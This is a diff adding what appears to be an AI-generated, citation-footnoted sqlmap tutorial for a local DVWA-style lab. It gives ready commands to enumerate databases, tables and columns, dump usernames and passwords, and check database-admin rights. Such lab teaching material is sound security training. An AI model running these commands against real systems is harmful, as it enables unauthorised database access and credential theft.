@@ -1,0 +1,59 @@
+To extract information systematically using the GET method in your local lab (such as DVWA, bWAPP, or custom HTML templates), you proceed through sequential steps. Each command builds upon the information discovered in the previous phase. [1, 2, 3] 
+Ensure you replace http://localhost:8080/vuln.php?id=1 with your actual local lab URL, and include your active session cookies so sqlmap can bypass the login wall. [1, 3, 4, 5] 
+------------------------------
+## Step 1: Enumerate Databases (--dbs)
+Once you identify an injectable GET parameter, your first exploit goal is to list all databases stored on the local database server. [2, 3] 
+
+sqlmap -u "http://localhost:8080/vuln.php?id=1" --cookie="PHPSESSID=your_cookie_here" -p id --dbs --batch
+
+
+* Expected Output: A list of database names (e.g., information_schema, dvwa, target_db). [3] 
+
+------------------------------
+## Step 2: Enumerate Tables (--tables)
+Choose an interesting database from the previous output (for example, dvwa) and scan it to uncover its internal database table structures. [1, 3] 
+
+sqlmap -u "http://localhost:8080/vuln.php?id=1" --cookie="PHPSESSID=your_cookie_here" -p id -D dvwa --tables --batch
+
+
+* Expected Output: A structural list of tables contained inside that database (e.g., users, guestbook, accounts). [1, 3] 
+
+------------------------------
+## Step 3: Enumerate Columns (--columns)
+Target a sensitive table (like users) to map out its specific data columns before attempting to read any contents. [1, 6] 
+
+sqlmap -u "http://localhost:8080/vuln.php?id=1" --cookie="PHPSESSID=your_cookie_here" -p id -D dvwa -T users --columns --batch
+
+
+* Expected Output: The names and data types of columns inside that table (e.g., user_id, username, password). [1, 7] 
+
+------------------------------
+## Step 4: Dump Table Entries (--dump)
+Now that you have mapped the schema, extract the data rows out of the target table. You can choose to pull specific columns (-C) to keep the terminal output readable. [1, 3, 6] 
+
+sqlmap -u "http://localhost:8080/vuln.php?id=1" --cookie="PHPSESSID=your_cookie_here" -p id -D dvwa -T users -C username,password --dump --batch
+
+
+* Expected Output: A clean plaintext table printing all the harvested laboratory credentials. [1, 3] 
+
+------------------------------
+## Step 5: Advanced System Fingerprinting
+If you want to quickly assess the backend architecture's administrative boundaries directly from the GET parameter, you can combine specific extraction switches: [1, 2] 
+
+* Get Database Banner & Software Version (-b):
+sqlmap -u "http://localhost:8080/vuln.php?id=1" --cookie="..." -b --batch
+* Find the Current Database User (--current-user):
+sqlmap -u "http://localhost:8080/vuln.php?id=1" --cookie="..." --current-user --batch
+* Check if you are Database Admin (--is-dba):
+sqlmap -u "http://localhost:8080/vuln.php?id=1" --cookie="..." --is-dba --batch [4, 7] 
+
+Would you like to learn how to save these complete local lab configurations into a configuration profile so you don't have to re-type cookies and URLs for every single terminal test run? [8] 
+
+[1] [https://www.youtube.com](https://www.youtube.com/watch?v=2YD4vygeghM&t=7)
+[2] [https://medium.com](https://medium.com/@vamsinallagatla478/what-is-sqlmap-injection-e34898bef1fc)
+[3] [https://www.youtube.com](https://www.youtube.com/watch?v=joZKlgR1J5A)
+[4] [https://www.youtube.com](https://www.youtube.com/watch?v=AL5YcDTbnS0&t=110)
+[5] [https://github.com](https://github.com/sqlmapproject/sqlmap/wiki/usage)
+[6] [https://lorikeetsecurity.com](https://lorikeetsecurity.com/blog/sqlmap-cheat-sheet)
+[7] [https://gist.github.com](https://gist.github.com/hackhunt/045ac00394d58911e4846b8dba86d5d0)
+[8] [https://mahimavi.medium.com](https://mahimavi.medium.com/sqlmap-cheat-sheet-9031298c6614)
